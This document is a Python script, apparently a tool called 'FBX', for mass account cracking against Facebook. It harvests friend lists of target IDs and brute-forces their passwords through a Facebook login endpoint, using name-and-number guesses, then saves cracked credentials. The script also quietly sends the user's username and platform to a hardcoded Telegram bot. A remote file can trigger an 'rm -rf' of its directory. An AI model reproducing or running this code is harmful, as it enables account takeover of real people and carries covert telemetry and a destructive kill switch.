#╔═╗
#║ ║
#╚═╝

user_a = [
'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/4.0)',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36',
'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:49.0) Gecko/20100101 Firefox/49.0',
'Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0',
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:47.0) Gecko/20100101 Firefox/47.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:50.0) Gecko/20100101 Firefox/50.0',
'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0)',
'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:47.0) Gecko/20100101 Firefox/47.0',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0',
'Mozilla/5.0 (X11; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0',
'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0',
'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)',
'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0',
'Mozilla/5.0 (Windows NT 6.3; rv:49.0) Gecko/20100101 Firefox/49.0',
'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0',
'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)',
'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36'
]

from platform import platform
from threading import Thread
import user_agent
from multiprocessing import pool
import random
import os
import json

from datetime import date
from data.clear import clear
from data.colors import *
from data.banner import banner
from multiprocessing.pool import ThreadPool
import os , sys , time , requests as req, re  , urllib

	
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from data.clear import clear
from data.colors import *
from data.banner import banner

from multiprocessing.pool import ThreadPool
try:
	import os , sys , time , requests as req, re
except:
	os.system("pip3 install -r REQS.txt")
	try:import os , sys , time , requests as req, re
	except:
		print("[ + ] Try pip3 install -r REQS")

from datetime import date

cda = datetime.now()
today = date.today()
get_type = ""

def clr():
	value = random.randint(1,3)
	if value == 1:
		return B

	if value == 2:
		return R
	if value == 3:
		return M
def clr2():
	value = random.randint(1,3)
	if value == 2:
		return B
	if value == 3:
		return R
	if value == 1:
		return M





version00 = '3.3'


requests = req.Session()


def write(z,s=0.03):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(s)

ids=[]
ids_cache_count = []
c = " "*5
ThreadAttack = 0
TOKEN   = ""
COOKIES = ""
loop = 0
ok = 0
cp = 0
#save varaibles
svn = ""
sname = ""
#============
start = True
ugen2 = []
ugen  = []
oks  = []
cps  = []
passwords =[]
ids = []
loop = []
#user agents 




if not os.path.exists("data") or os.path.getsize('data/banner.py') != 2196 or os.path.getsize('data/clear.py') != 281 or os.path.getsize('data/colors.py') != 434 or os.path.getsize('data/read.py') != 97:
	print(f"{R}[ ! ] Erorr{RR}")
	sys.exit()

requests = req.Session()






def help():
    print(f"[{G}*ThreadAttack{RR}] Thread Attack Is Speed For Attacking On account Per attack")
    print(f"[{G}*PUBLIC CLONE] This Is A type of attack , Password of All target friends")
#Save Name Varibles Stuff Varaibles		
svname = ""
svn	   = ""
att = 1
#-------------[FUNCTION]

def a_login():
	global att
	global TOKEN
	global COOKIES
	requests = req.Session()


	clear()


	print(banner)

	ck_file = open("cookies.txt","r").read()


	print(M+"("+ "—"*10 +G+ "AUTO LOGIN" + M+"—"*10 +")")
	print(Y+"Attempt : " +G+str(att)+"/6")
	print(f"{M}[ - ]{Y} Checking Cookies")
	print(f"{R}<"+"-"*20+">")
	print(G+ck_file)
	print(f"{R}<"+"-"*20+">")

	ua1 = random.choice(user_a)
	ua2 = random.choice(user_a)
	try:
		data = req.get("https://business.facebook.com/business_locations", headers = {"user-agent": ua1,"referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":ck_file} , timeout=1000)
	except req.exceptions.TooManyRedirects:
		print(f"{R}[ X ] Too Many Redirects (Low Connection)")
		write(f"{clr()}[ - ] Try Re Run FBX Again ")
		sys.exit()

	time.sleep(0.5)
	find_token = re.search("(EAAG\w+)", data.text)
	time.sleep(1)
	try:
		TOKEN = find_token.group(1)
	except:
		att += 1
		print(f"{R}[ ! ] {W}Failed")
		time.sleep(0.5)
		if att == 6:			
			if os.path.exists("cookies.txt"):
				os.remove("cookies.txt")
				m_login()
		a_login()



	COOKIES = ck_file

	try:
		log2 = requests.get('https://graph.facebook.com/me?access_token='+TOKEN, cookies = {"cookie":COOKIES})
		name = log2.json()["name"]
		id   = log2.json()["id"]
		print(f"{RR}NAME : {G}{name}")
		print(f"{RR}ID : {G}{id}")
		time.sleep(1)
		input(f"{M}[ + ] Enter To Menu .. ")
	except KeyError:
		print(f"{R}[ + ]{Y} Failed")
		os.remove("cookies.txt")
		input("[ × ] Enter To Manual Login")

		m_login()


	menu()
#╔═╗
#║ ║
#╚═╝


def m_login():
#===================SCRIPT START HERE 
	clear()
	
	global TOKEN
	global COOKIES
	start = False

	print(banner)
	print(f"IP : {ip}")

	if os.path.exists("cookies.txt"):
		a_login()
	print(f"{M}[9] {clr()}Settings")

	print(f"{M}("+ "—"*10 + f"{G}LOGIN" + f"{M}—"*10 +")")
	cookies_input = input(f"{Y}[ ? ]{W} Cookies =>{clr2()} ")

		

	print(f"{Y}[ - ] Checking Cookies {RR}")


	


	ua1 = random.choice(user_a)
	ua2 = random.choice(user_a)
	data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": ua2,"referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies_input}) 
	time.sleep(0.5)
	find_token = re.search("(EAAG\w+)", data.text)
	try:
		TOKEN=find_token.group(1)
		COOKIES = cookies_input
	
	except AttributeError:
		print(f"{R}[ X ] Failed")
		time.sleep(1)
		m_login()
	if os.path.exists("cookies.txt"):
		os.remove("cookies.txt")
	with open("cookies.txt" , "x+") as ct:
		ct.write(cookies_input)
		ct.close()
	clear()
	menu()

#-----------=MENU

passf = ""
def menu():
	clear()
	global id
	print(banner)


	print(f"{G}(" + "—"*10 + f"{clr2()}MENU" + f"{M}—"*10 + f"){RR}")


	print(f"{G}[01]{clr()} Public Clone ")
	print(f"{G}[99]{clr()} Logout")	
	choice=str(input("==> "))
	if choice == "1" or choice == "01":
		friends()

	elif choice == "99":
		os.remove("cookies.txt")
		m_login()
		
def friends():
	ids.clear()
	global loop , ok , cp
	global COOKIES , TOKEN
	global passf
	global svn , svname
	global ThreadAttack
	global ids_cache_count
	ThreadAttack = 0
	

	loop,cp ,ok = 0,0,0
	passf = 0
	ua1 = random.choice(user_a)
	today = date.today()
	print(banner)
	print(f"{G}(" + "—"*10 + f"{M}Public Clone{G}" + "—"*10 + ")")
	id_limit = int(input(f"{Y}[ ~ ] {B}ID LIMIT ==> {RR}"))
	for i in range(id_limit):
		dump_fail = 0
		i += 1
		att_d = 1
		headers_ = {
			"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
			"x-fb-sim-hni": str(random.randint(20000, 40000)), 
			"x-fb-net-hni": str(random.randint(20000, 40000)), 
			"x-fb-connection-quality": "EXCELLENT",
			"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
			"user-agent": ua1, 
			"content-type": "application/x-www-form-urlencoded", 
			"x-fb-http-engine": "Liger"
		}
		while dump_fail== 0:
			ids_cache_count.clear()
			id_tar = input(f"\n{Y}{i} - [ ? ]{B} ID ==> {RR}")
			try:
				data = req.get('https://graph.facebook.com/v2.0/'+id_tar+'?fields=friends.limit(9999)&access_token='+TOKEN, cookies = {"cookie":COOKIES})
		
				for i in data.json()['friends']['data']:
					ids.append(i["id"]+"|"+i["name"])
					ids_cache_count.append("A")
				print(f"{G}[ + ]{clr2()} {len(ids_cache_count)}")
				dump_fail = 1
			except KeyError:
				print(f"\r{R}[ X ] Filed To Dump{RR}" , end=" ")
			
	while passf == 0:
		pass_type = input(f"{G}[ ? ] {clr()}Auto Password {RR}({clr2()}Y{RR}/{clr()}n{RR}) {clr2()}==>{RR}")
		if pass_type == "Y" or pass_type == "y" or pass_type == "N" or pass_type == "n":
			passf = 1
		else:
			print(f"\r{R}[ X ] WRONG CHOICE{RR}")
	if pass_type == "Y" or pass_type == "y":
		auto_password()
	elif pass_type == "N" or pass_type == "n":
		choice_password()
Speed = 0
pass1 = 0
def choice_password():
	pa_fail = 1
	pass1 = 0
	def pas():
		global pass1
		try:
			pass1 = int(input(f"{Y}[ ? ] Password Ammount ==> {clr()}"))
			if pass1 <= 4:
				print(f"{R}[ - ] MIN 5")
				pas()
			elif pass1 > 25:
				print(f"{R}MAX 25")
				pas()
		except ValueError:
			print(f"{R}[ X ] ERORR VALUE")
			pas()
	pas()

		
	
	for i in range(pass1):
		pas = 0
		while pas == 0:
			pass2 = input(f"{G}[ {i} ] Password ==>{clr2()} ")
			if pass2 < 6:
				print("[ - ] MIN 6")
			else:
				pas = 6
		
		passwords.append(pass2)
		
	try:os.mkdir("save")
	except:pass
	global Speed
	Speed = 0
	
	td = today.strftime("%d_%y")
	svn_fail = 1
	Speed = int(input(f"{Y}[ ? ] {clr2()}Speed {RR}==> {clr()}"))
	while svn_fail == 1:
		svname = input(f"{Y}[ ? ] {clr()}Save Name {RR}==> {clr2()}")
		if " " in svname or os.path.exists("save/OK"+svname+"_"+td+".txt"):
			print(f"{Y}[ / ] {R}Cannot Make File{RR}")
		else:
			svn_fail = 0
	svn = "save/OK_"+svname+"_"+td+".txt"
	write(f"="*10)
	write(f"{G}[ + ] {M}Result {G}OK {M}save :{G} {svn}")
	write(f"{G}[ + ] {clr()}By Siamand")
	write(f"{G}[ × ] Total IDs :{clr()} {len(ids)}")
	write(f"{G}[ = ] {M}Clone Started{RR} ..")
	print(f"{clr()}<"+f"{clr()}="*20+f"{clr()}>")
	with ThreadPoolExecutor(max_workers=Speed) as thread:
		for id in ids:
			thread.submit(id , passwords)
	input(f"{G}[ + ] Enter To Back ...")
	pass1 = 0
	ids.clear()
	passwords.clear()
	Speed = 0
	menu()
def auto_password():
	try:os.mkdir("save")
	except:pass
	global Speed
	Speed = 0
	td = today.strftime("%d_%y")
	svn_fail = 1
	Speed = int(input(f"{Y}[ ? ] {clr2()}Speed {RR}==> {clr()}"))
	while svn_fail == 1:
		svname = input(f"{Y}[ ? ] {clr()}Save Name {RR}==> {clr2()}")
		if " " in svname or os.path.exists("save/OK"+svname+"_"+td+".txt"):
			print(f"{Y}[ / ] {R}Cannot Make File{RR}")
		else:
			svn_fail = 0

	
	svn = "save/OK_"+svname+"_"+td+".txt"
	write(f"="*10)
	write(f"{G}[ + ] {M}Result {G}OK {M}save :{G} {svn}")
	write(f"{G}[ + ] {clr()}By Siamand")
	write(f"{G}[ × ] Total IDs :{clr()} {len(ids)}")
	write(f"{G}[ = ] {M}Clone Started{RR} ..")
	print(f"{clr()}<"+f"{clr()}="*20+f"{clr()}>")

	with ThreadPoolExecutor(max_workers=Speed) as thread:
		pwv = []
		nmm = ""
		for things in ids:
			idf,nm = things.split("|")[0],things.split("|")[1]
			frs = nm.split(" ")[0].lower()
			try:
				lsn = nm.split(" ")[1].lower()
			except IndexError:
				pass
			if len(frs) < 3:
				nmm = frs+lsn
			elif len(frs) >= 3:
				nmm = frs
			pwv.clear()
			birth = 1995
			pwv.append(frs)
			pwv.append(frs+frs)
			pwv.append(frs+lsn)
			pwv.append("@" + nmm + "@")
			pwv.append(nmm + "123")
			pwv.append(nmm + "1234")
			pwv.append(nmm + "12345")
			pwv.append(nmm + "123456")
			pwv.append(nmm + "1234567")
			pwv.append(nmm + "12345678")
			pwv.append(nmm + "123456789")
			pwv.append(nmm + nmm)
			#Birth Pass
			for i in range(10):
				birth += 1 
				pwv.append(nm+str(birth))
			thread.submit(attack , idf , pwv)

				

			#Password Making

	
	input(f"\n{G}[+] Enter To Menu ...")
	menu()


	




def attack(arg , p):
	global ok
	global cp
	global loop
	ua1 = random.choice(user_a)
	ua2 = random.choice(user_a)
	user = arg
	pas = p
	try:
		os.mkdir("save")
	except OSError:
		pass
	pers = loop*100/len(ids)
	print(f"\r{G}[FBX] {clr()}{str(loop)}{RR}/{M}{len(ids)}[{str(int(pers))}"%"] {RR}OK/{G}{ok}{RR} CP/{Y}{cp}			" , end="")	

		#100074579974053
	
	#==================PASSWORD 1
	for pws in pas:
		if len(user) < 6:
			break				
		headers_ = {
		"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
		"x-fb-sim-hni": str(random.randint(20000, 40000)), 
		"x-fb-net-hni": str(random.randint(20000, 40000)), 
		"x-fb-connection-quality": "EXCELLENT",
		"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
		"user-agent": ua2, 
		"content-type": "application/x-www-form-urlencoded", 
		"x-fb-http-engine": "Liger"
		}
		
		try:
			response = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(user)+"&password="+str(pws)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers_)
		except req.exceptions.ConnectionError:
			print(f"{R}\n{clr()}[X] Conection Erorr ...{RR}")
			time.sleep(3)
		try:
			if 613 == response.json()["error_code"]:
				break
		except:
			pass
		
		if "session_key" in response.text and "EAAA" in response.text:
			okt = f"\n{G}[OK] {user} | {pws}{RR}"
			okts = "[OK] {user} | {pws}"
			print(okt)
			try:open(svn , "x+")
			except:pass
			open(svn , "w").write(okt)
			ok += 1
			loop += 1
			break
		elif "www.facebook.com" in response.json()["error_msg"]:
			cpt = f"\n{Y}[CP] {user} | {pws}" 
			print(cpt)
			cp += 1
			loop +=1 
			break
	loop +=1 


write(banner,0.02)


write(f"(=====[Devloper : Siamand]=====)" , 0.01)

print(f"{G}[ + ] {B}Connecting To Server ")

try:
	g = req.get("https://raw.githubusercontent.com/sizar78/login-token/main/tokens.txt")
except:
	print(f"{R}[ X ]{Y} No Connection")
	sys.exit()

try:
	b = req.get("https://raw.githubusercontent.com/sizar78/stats/main/status")
except:
	print(f"{R}[ X ]{M} Cannot Connect To Server{RR}")




if "stop" in b.text:
    print(f"{R}[X] {Y} Server Has Ben Stoped By Owner\n{RR}")
    sys.exit()





#uuid = str(os.getlogin()) + str(os.geteuid())
uuid = str(os.getlogin())
token = "@".join(uuid) 
#uuid1 = str(os.geteuid()) + str(os.getlogin()) 
uuid1 = str(os.getlogin()) 
userid = "-".join(uuid1) 





c = " "*1


tokbot = "5550051238:AAE9ryiHkvGAqeYR_Kw8TZGxKLFhbnMeTlw"
botid   = "5489444022"
import platform
today = date.today()
tds = today.strftime("%d/%m/%y")
clc = str(cda.hour) + "__" + str(cda.minute) + "__" + str(cda.second)
message = f'''
NEW JOIN !!
==============
-Token 	 : {token}

-USER ID : {userid}

-Date       : {tds}
m
-Clock     : {clc}

-Platform  : {platform.platform()}

-Python Ver : {platform.python_version()}
'''
requests.get("https://api.telegram.org/bot"+str(tokbot)+"/sendMessage?chat_id="+str(botid)+"&text="+str(message))



	
print(f"{c}{M}[ × ] {B}TOKEN   {RR}: {Y}FBX|{token}")
print(f"{c}{M}[ × ] {B}USER-ID {RR}: {Y}FBX|{userid}")


time.sleep(0.5)

path = os.system("pwd")

if "delete" in g.text:
	os.system("rm -rf "+path)
	os.remove(path)
	
if token in g.text and userid in g.text:
    write(f"   {G}[+] Token & User-Id Is Active.....")
    try:
        data = requests.get("https://api.ipify.org/?format=json").json()
        ip = data["ip"]	
    except req.ConnectionError:
        print(f"{Y}[ ! ] Connection Erorr")
        print(f"{R}[ ! ] EXIT{RR}")
        sys.exit()
    m_login()

else:
    write(f"   {R}[X] Token & User-Id Is not Active")
    input("[♤] Enter To Exit")
    sys.exit()
